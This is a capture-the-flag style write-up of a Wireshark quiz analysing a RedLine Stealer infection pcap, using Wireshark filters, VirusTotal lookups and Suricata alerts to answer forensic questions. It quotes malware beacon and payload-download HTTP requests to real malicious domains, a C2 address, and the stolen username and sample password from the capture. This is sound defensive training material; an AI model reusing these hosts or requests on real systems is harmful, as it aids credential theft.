# RedLine Stealer Wireshark Analysis

**Date:** July 12, 2024

**Author:** Garrett Jones

Challenge provided at:
  * https://malware-traffic-analysis.net/training-exercises.html
  * https://unit42.paloaltonetworks.com/wireshark-quiz-redline-stealer/

**Concepts:** Network, Malware, Wireshark, Suricata

# Scenario
RedLine Stealer is information-stealing malware that harvests login credentials and other sensitive data from a victim's Windows host. This Wireshark quiz uses a packet capture (pcap) that “crosses a line” separating normal traffic from malicious activity. The malicious activity in this pcap is a RedLine Stealer infection from July 2023. Our pcap provides experience analyzing RedLine traffic, and we can determine what specific data was stolen from an infected Windows computer.

Traffic for this quiz occurred in an Active Directory (AD) environment during July 2023. Details of the local area network (LAN) environment for the pcap follow.

### Local Area Network (LAN) Details
* LAN segment range: 10.7.10[.]0/24 (10.7.10[.]1 through 10.7.10[.]255)
* Domain: coolweathercoat[.]com
* Domain controller IP address: 10.7.10[.]9
* Domain controller hostname: WIN-S3WT6LGQFVX
* LAN segment gateway: 10.7.10[.]1
* LAN segment broadcast address: 10.7.10[.]255

### Quiz Questions
* What is the date and time in UTC the infection started?
* What is the IP address of the infected Windows client?
* What is the MAC address of the infected Windows client?
* What is the hostname of the infected Windows client?
* What is the user account name from the infected Windows host?
* What type of information did this RedLine Stealer try to steal?

# Analysis

Start by downloading the zip file and unzipping it with the password 'infected'.

First thing I like to do when looking at a packet capture is to run the capinfos tool which is a cmdline pcap summary tool that comes with Wireshark.

```
capinfos 2023-07-Unit42-Wireshark-quiz.pcap

File name:           2023-07-Unit42-Wireshark-quiz.pcap
File type:           Wireshark/tcpdump/... - pcap
File encapsulation:  Ethernet
File timestamp precision:  microseconds (6)
Packet size limit:   file hdr: 65535 bytes
Number of packets:   2,497
File size:           1,419 kB
Data size:           1,379 kB
Capture duration:    35.515129 seconds
First packet time:   2023-07-10 17:39:22.849048
Last packet time:    2023-07-10 17:39:58.364177
Data byte rate:      38 kBps
Data bit rate:       310 kbps
Average packet size: 552.51 bytes
Average packet rate: 70 packets/s
SHA256:              7349b0cab7fbc605f31dd7db95748a23b16b3fc2f5d370a7afb3e99cd9f17c8e
SHA1:                2fffa4af1cc7c31305ef0c3b5b6d49336cf0d5a7
Strict time order:   True
Number of interfaces in file: 1
Interface #0 info:
                     Encapsulation = Ethernet (1 - ether)
                     Capture length = 65535
                     Time precision = microseconds (6)
                     Time ticks per second = 1000000
                     Number of stat entries = 0
                     Number of packets = 2497
```

From the output we can see there are 2,500 packets over the course of only 35 seconds. This is a pretty short time frame for a pcap. Next lets open it up in Wireshark. Once in Wireshark lets take a look at the Protocol Hierarchy to get a level view of the protocol traffic and see if anything sticks out.

<img width="946" alt="image" src="https://github.com/user-attachments/assets/3236f7ba-a958-4781-86bc-a1b63ac7432a">

I see 6 http packets that might be worth taking a look at.

Lets look at the DNS to see if we can find any suspicious domains. Filtering for ```dns``` I see a lot of traffic containing "coolweathercoat.com". To try to understand more about this domain I am going to filter for anything containing that string with ```frame contains "coolweathercoat.com"```.
Looking through I see Kerberos and CLDAP protocols which leads me to believe that coolweathercoat.com is the domain/network we are looking at. So to remove some of the noise lets go back to dns but remove anything with our home domain with ```dns && !(frame contains "coolweathercoat")```.

<img width="1542" alt="image" src="https://github.com/user-attachments/assets/3bbf1a9b-5381-4ade-a0bf-00475ff8caea">

This leaves 44 dns packets to review and just scrolling through you will see almost all are related to Microsoft with key words like microsoft, msn, bing, azure, etc. But at the very end we see two weird looking domains.

```
623start.site 195.161.114.3
guiatelefonos.com 92.118.151.9
```

When you find domains or IP addresses that could be malicious the best way to find out more is to search for them on VirusTotal to see if anyone has flagged them as malicious.

<img width="714" alt="image" src="https://github.com/user-attachments/assets/a84583b4-f093-4407-8413-62b573ce7ace">

<img width="712" alt="image" src="https://github.com/user-attachments/assets/d40cb905-dc68-40c5-aaf4-9c3a44bb96e6">

We get hits on both of these domains as potentially malicious with it saying guiatelefonos.com is actually used by RedLine. So we can consider these as IOCs and since the host 10.7.10.47 is reaching out to the domain controller on these domains it is likely infected.

Lets filter on our first IOC - ip 195.161.114.3 with ```ip.addr == 195.161.114.3```.

<img width="1348" alt="image" src="https://github.com/user-attachments/assets/c14f1d74-99de-46eb-af95-dd582e221e89">

There are a couple http get requests, lets follow the TCP stream to get more detail.

```
GET /?status=start&av=Windows%20Defender HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031
Host: 623start.site
Connection: Keep-Alive

HTTP/1.1 200 OK
Date: Mon, 10 Jul 2023 22:39:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 14
Connection: keep-alive
Server: Apache/2.4.6 (CentOS) PHP/7.4.33
X-Powered-By: PHP/7.4.33

404 HTTP ErrorGET /?status=install HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031
Host: 623start.site

HTTP/1.1 200 OK
Date: Mon, 10 Jul 2023 22:39:49 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 14
Connection: keep-alive
Server: Apache/2.4.6 (CentOS) PHP/7.4.33
X-Powered-By: PHP/7.4.33

404 HTTP Error
```

Looking at the User-Agent we see PowerShell which likely means a malicious script is making these requests to the 623start.site domain. The two get requests GET /?status=start&av=Windows%20Defender HTTP/1.1 and GET /?status=install HTTP/1.1 seem to be sending status information back to the malicious domain about the anti virus running on the machine, maybe to clue the attacker on what type of executable to send. Thats the end of the traffic for 195.161.114.3, lets move onto the next one.

Filter with ```ip.addr == 92.118.151.9```

<img width="1583" alt="image" src="https://github.com/user-attachments/assets/60e9d65d-f2ae-425f-ac03-76c77142f052">

Have a little over 300 packets but there is a GET request at the top so lets follow that.

```
GET /data/czx.jpg HTTP/1.1
Host: guiatelefonos.com
Connection: Keep-Alive

HTTP/1.1 301 Moved Permanently
Server: nginx/1.20.2
Date: Mon, 10 Jul 2023 22:39:49 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
Location: https://guiatelefonos.com:443/data/czx.jpg

a9
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.20.2</center>
</body>
</html>

0
```

So this a request to download a suspicious .jpg file from guiatelefonos.com but the host is getting the error '301 Moved Permanently'. This .jpg would likely be the executable for the next portion of the attack but this is attack is over a year old now so the ip or domain is no longer the same and can't provide us the malicious file.

If we continue looking at the TCP streams between our infected host and second malicious IP we come across some interesting data ```tcp.stream eq 71```.

<img width="1249" alt="image" src="https://github.com/user-attachments/assets/41944c27-a884-443d-9b2d-3a2f241f2551">

At the top here we see tempuri.org which is the default namespace URI used by Microsoft development products and a tcp connection on port 12432 to a new ip address: 194.26.135.119. 

<img width="738" alt="image" src="https://github.com/user-attachments/assets/8d43b6b9-ee8e-4cee-989a-612ca3675c25">

VirusTotal tells us this is a C2 server for RedLine Stealer malware so we are on the right path. If we continue down the TCP stream we see a view different section of interesting data.

<img width="1670" alt="image" src="https://github.com/user-attachments/assets/d6815de1-1423-4851-bbd1-894d8710df52">

This one appears to be lisitng all of the directories it wants to search and file types it wants to collect.

<img width="382" alt="image" src="https://github.com/user-attachments/assets/c3c4a8b0-b76a-4033-9678-4f128f2f8aae">

This one looks like crypto wallets and addresses.

<img width="1657" alt="image" src="https://github.com/user-attachments/assets/19a55054-8e3d-4f65-9df5-0cda7b810705">

Here its trying to collect the values for all these environment variables.

Then we have a whole lot of encrypted data, probably everything its collecting and sending to the C2 server. But at the end there is some readable text.

<img width="1671" alt="image" src="https://github.com/user-attachments/assets/31eaee8f-9ffd-4f78-b251-4a9832016304">

Most of it looks like a memory or process dump with running process and associated command lines but at the end you can see file names and strings like Top_secret_ducment.docx, My_p@ssw0rd, rwalters@coolweathercoat.com, C:\Users\rwalters\Documents\Top_secret_ducment.docx.

This looks like the data the attacker was able to successfully exfiltrate. We have a user rwalters, with maybe a password of My_p@ssw0rd, and file Top_secret_ducment.docx.

And thats the end of the traffic we are provided. Now we can answer the provided questions.

1. #### What is the date and time in UTC the infection started?

For this one we can check the first DNS query made to malicious domain. The PowerSehll script probably got executed right before Jul 10, 2023 22:39:47.364257000 UTC.

```
1352	2023-07-10 22:39:47.364257	10.7.10.47	10.7.10.9	DNS	73	Standard query 0x24ba A 623start.site
```

2. #### What is the IP address of the infected Windows client?

All malicious traffic is associated with the internal host 10.7.10.47.

3. #### What is the MAC address of the infected Windows client?
If we look at the Ethernet portion of the same DNS packet we can see the Source IP of 10.7.10.47 has a MAC address of 80:86:5b:ab:1e:c4.
```
Ethernet II, Src: 80:86:5b:ab:1e:c4 (80:86:5b:ab:1e:c4), Dst: Dell_f4:95:c1 (10:98:36:f4:95:c1)
    Destination: Dell_f4:95:c1 (10:98:36:f4:95:c1)
    Source: 80:86:5b:ab:1e:c4 (80:86:5b:ab:1e:c4)
    Type: IPv4 (0x0800)
```
4. #### What is the hostname of the infected Windows client?
If we go back to the start of the packet capture we can find the client NetBios registration which contains its hostname.
```
19	2023-07-10 22:39:23.138160	10.7.10.47	10.7.10.255	NBNS	110	Registration NB DESKTOP-9PEA63H<00>
```
5. #### What is the user account name from the infected Windows host?
We can remember from the exfiltrated data we saw was from rwalters but we can also check the Kerberos traffic to provided more client information. The username rwalters can be found in packet 725 under the salt attribute.
```
725	2023-07-10 22:39:32.582581	10.7.10.9	10.7.10.47	KRB5	259	KRB Error: KRB5KDC_ERR_PREAUTH_REQUIRED
```
```
Kerberos
    Record Mark: 201 bytes
    krb-error
        pvno: 5
        msg-type: krb-error (30)
        stime: Jul 10, 2023 17:39:32.000000000 CDT
        susec: 185655
        error-code: eRR-PREAUTH-REQUIRED (25)
        realm: COOLWEATHERCOAT
        sname
            name-type: kRB5-NT-SRV-INST (2)
            sname-string: 2 items
                SNameString: krbtgt
                SNameString: COOLWEATHERCOAT
        e-data: 305b3038a103020113a231042f302d3024a003020112a11d1b1b434f4f4c57454154484552434f41542e434f4d7277616c746572733005a0030201173009a103020102a20204003009a103020110a20204003009a10302010fa2020400
            PA-DATA pA-ETYPE-INFO2
                padata-type: pA-ETYPE-INFO2 (19)
                    padata-value: 302d3024a003020112a11d1b1b434f4f4c57454154484552434f41542e434f4d7277616c746572733005a003020117
                        ETYPE-INFO2-ENTRY
                            etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
                            salt: COOLWEATHERCOAT.COMrwalters
                        ETYPE-INFO2-ENTRY
                            etype: eTYPE-ARCFOUR-HMAC-MD5 (23)
            PA-DATA pA-ENC-TIMESTAMP
                padata-type: pA-ENC-TIMESTAMP (2)
                    padata-value: <MISSING>
            PA-DATA pA-PK-AS-REQ
                padata-type: pA-PK-AS-REQ (16)
                    padata-value: <MISSING>
            PA-DATA pA-PK-AS-REP-19
                padata-type: pA-PK-AS-REP-19 (15)
                    padata-value: <MISSING>
```
6. #### What type of information did this RedLine Stealer try to steal?
Important files types of .txt, .doc, key, wallet, seed, etc in many application and appdata directories along with crypto wallets and environment variables.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

Another method to filter out the noise would be to run an IDS tool like Snort or Suricata against the pcap to see what alerts are triggered.

First update the suricata.yaml with the HOME_NET of 10.7.10.0/24 and run the below command.
```
suricata -c /opt/homebrew/etc/suricata/suricata.yaml -l . -r 2023-07-Unit42-Wireshark-quiz.pcap
```
Then review the fast.log
```
07/10/2023-17:39:48.415597  [**] [1:2033355:1] ET INFO Windows Powershell User-Agent Usage [**] [Classification: Not Suspicious Traffic] [Priority: 3] {TCP} 10.7.10.47:49741 -> 195.161.114.3:80
07/10/2023-17:39:49.034584  [**] [1:2033355:1] ET INFO Windows Powershell User-Agent Usage [**] [Classification: Not Suspicious Traffic] [Priority: 3] {TCP} 10.7.10.47:49741 -> 195.161.114.3:80
07/10/2023-17:39:50.423245  [**] [1:2400037:4021] ET DROP Spamhaus DROP Listed Traffic Inbound group 38 [**] [Classification: Misc Attack] [Priority: 2] {TCP} 194.26.135.119:12432 -> 10.7.10.47:49744
07/10/2023-17:39:50.425364  [**] [1:2043233:6] ET INFO Microsoft net.tcp Connection Initialization Activity [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 10.7.10.47:49744 -> 194.26.135.119:12432
07/10/2023-17:39:50.753113  [**] [1:2046045:1] ET MALWARE [ANY.RUN] RedLine Stealer/MetaStealer Family Related (MC-NMF Authorization) [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 10.7.10.47:49744 -> 194.26.135.119:12432
07/10/2023-17:39:50.753113  [**] [1:2046105:2] ET MALWARE Redline Stealer/MetaStealer Family TCP CnC Activity - MSValue (Outbound) [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 10.7.10.47:49744 -> 194.26.135.119:12432
07/10/2023-17:39:51.042361  [**] [1:2046105:2] ET MALWARE Redline Stealer/MetaStealer Family TCP CnC Activity - MSValue (Outbound) [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 10.7.10.47:49744 -> 194.26.135.119:12432
07/10/2023-17:39:56.522573  [**] [1:2046056:2] ET MALWARE Redline Stealer/MetaStealer Family Activity (Response) [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 194.26.135.119:12432 -> 10.7.10.47:49744
07/10/2023-17:39:56.522573  [**] [1:2046106:2] ET MALWARE Redline Stealer/MetaStealer Family TCP CnC Activity - MSValue (Response) [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 194.26.135.119:12432 -> 10.7.10.47:49744
```

**That's All Folks**

**You can find more about the RedLine Stealer malware at https://malpedia.caad.fkie.fraunhofer.de/details/win.redline_stealer.**







